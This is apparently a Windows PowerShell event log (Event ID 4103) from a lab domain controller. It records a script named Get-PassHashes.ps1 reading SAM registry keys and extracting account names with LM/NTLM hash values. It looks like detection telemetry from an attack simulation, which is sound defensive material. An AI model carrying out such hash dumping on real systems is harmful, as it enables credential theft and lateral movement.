ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 142
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588943500Z" />
    <EventRecordID>14252</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f83a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 142
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 140
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588673100Z" />
    <EventRecordID>14251</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f73a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 140
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="504"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 138
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588391700Z" />
    <EventRecordID>14250</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f63a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 138
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="504"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="WDAGUtilityAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 136
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588028700Z" />
    <EventRecordID>14249</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f53a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 136
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="WDAGUtilityAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 134
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.587592600Z" />
    <EventRecordID>14248</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f33a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 134
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

